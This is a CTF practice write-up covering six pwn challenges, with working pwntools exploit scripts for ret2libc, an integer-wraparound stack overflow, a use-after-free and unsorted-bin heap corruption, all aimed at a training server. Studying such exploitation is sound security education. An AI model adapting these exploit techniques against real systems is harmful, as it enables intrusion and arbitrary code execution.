---
title: CUMT Pwn Practice
translation_id: cumt-pwn
source_digest: c6e3354463c6f08bc037a7e73721092e19ff82aeb380a446b79484f32ae9103c
tags:
  - Pwn
  - Stack Overflow
  - ret2libc
categories:
  - Cybersecurity
  - CTF
---

## pwn1

This was just a connectivity test. Connecting to the challenge returned the flag.

## pwn2
The service gave us a password and expected us to send it back.
The important part was reading the prompt carefully enough to identify exactly which bytes belonged to the password.
```python
from pwn import *
r=remote("219.219.61.234",6666 )
print(r.recvuntil(b'*\n').decode())
p=r.recvuntil(b'\n')[:-1]
print(bytes(p))
r.sendline(bytes(p))
r.interactive()
```
## pwn3
This challenge concerned ret2libc.

I started by leaking the address of puts in libc.
Passing puts_got gave me the runtime address of puts.
I calculated the offset from puts to system with `libc.symbols["system"] - libc.symbols["puts"]`.
Adding that offset to the leaked address gave me the runtime address of system.
Then I used `elf.search('sh\x00').__next__()` to find the address of the sh string.
The binary had no stack canary.
The buffer was 0x38 bytes. I padded the payload with 60 a’s, then added the system and sh addresses to get a shell.
```python
from pwn import *

#r = process(b'./pwn3')
r=remote('219.219.61.234',10003)
elf = ELF(b'./pwn3')
libc = ELF(b'./libc.so.6')

print(r.recv().decode())
puts_got = elf.got['puts']
print(puts_got)

r.send(str(puts_got).encode())
r.recvuntil(b' : ')
puts_addr = int(r.recvuntil(b'\n')[:-1],16)
print(puts_addr)

system_addr = puts_addr + libc.symbols["system"] - libc.symbols["puts"]
print(system_addr)

p = b'a'*60 + p32(system_addr) + p32(0xdeadbeef) + p32(elf.search(b'sh\x00').__next__())
r.recvuntil(b' :')
r.sendline(p)

r.interactive()
```

## pwn4
There was no stack canary, but the first two inputs didn’t overflow the stack.
![image-20211205232110426](https://res.cloudinary.com/sycamore/image/upload/v1792696489/Typora/2021/12/dc2c87519810519185f4e3c91622b01d.png)
The variable v3 was an unsigned eight-bit integer. Its limited range made integer wraparound relevant here.

Its maximum value is 255. The input just needs to be between 255 + 4 and 255 + 8 bytes long.

```python
from pwn import *

#r = process('./pwn4')
r = remote("219.219.61.234",10004 )

backdoor=0x0804868B
p = b'a'*0x18 + p32(backdoor) + b'a'*(259-0x18-4)

r.recvuntil(b'choice:')
r.sendline(b'1')
r.recvuntil(b'username:')
r.sendline(b'123')
r.recvuntil(b'passwd:')
r.sendline(p)

r.interactive()
```

## pwn5
A use-after-free bug.
Freeing the allocation didn’t clear the reference. A later access through it could read storage that no longer belonged to the object.

I added two notes and freed them in order. When I created an eight-byte note, its content reused the first note’s allocation. The old pointer was still there.
Writing the backdoor function’s address into the new note made the print operation call that function.
```python
from pwn import *

#r = process(b'./pwn5')
r=remote('219.219.61.234',10000)

backdoor=0x08048986

def add(size,content):
    r.recvuntil(b':')
    r.sendline(b'1')
    r.recvuntil(b':')
    r.sendline(str(size))
    r.recvuntil(b':')
    r.send(content)

def delete(idx):
    r.recvuntil(b':')
    r.sendline(b'2')
    r.recvuntil(b':')
    r.sendline(str(idx))

def Print(idx):
    r.recvuntil(b':')
    r.sendline(b'3')
    r.recvuntil(b':')
    r.sendline(str(idx))

add(32,'aaaa')
add(32,'aaaa')
delete(0)
delete(1)
add(8,p32(backdoor))
Print(0)

r.interactive()
```

## pwn6
The final exercise combined a heap overflow with unsorted-bin corruption.

The goal was to set v3 to 4869 and make qword_6020C0 greater than 0x1305.
![image-20211205232125920](https://res.cloudinary.com/sycamore/image/upload/v1792696487/Typora/2021/12/d1aaf56f4760a578927720faa790c02a.png)
The function selected by v3 = 2 had a heap overflow. I used it to change the chunk’s bk pointer to the address of qword_6020C0 minus 16.

```python
from pwn import *

#r = process('./pwn6')
r = remote("219.219.61.234",10001 )
elf=ELF(B'./pwn6')

def create(size,content):
    r.recvuntil(b':')
    r.sendline(b'1')
    r.recvuntil(b':')
    r.sendline(str(size))
    r.recvuntil(b':')
    r.sendline(content)

def edit(idx,size,content):
    r.recvuntil(b':')
    r.sendline(b'2')
    r.recvuntil(b':')
    r.sendline(str(idx))
    r.recvuntil(b':')
    r.sendline(str(size))
    r.recvuntil(b':')
    r.sendline(content)

def delete(idx):
    r.recvuntil(b':')
    r.sendline(b'3')
    r.recvuntil(b':')
    r.sendline(str(idx))

create(0x20,'aaaa')
create(0x80,'bbbb')
create(0x20,'cccc')

delete(1)

magic = 0x6020C0
fd = 0
bk = magic -0x10

edit(0,0x40,b'a' * 0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))

create(0x80,b'aaaa')
r.recvuntil(b':')
r.sendline(b'4869')

r.interactive()
```
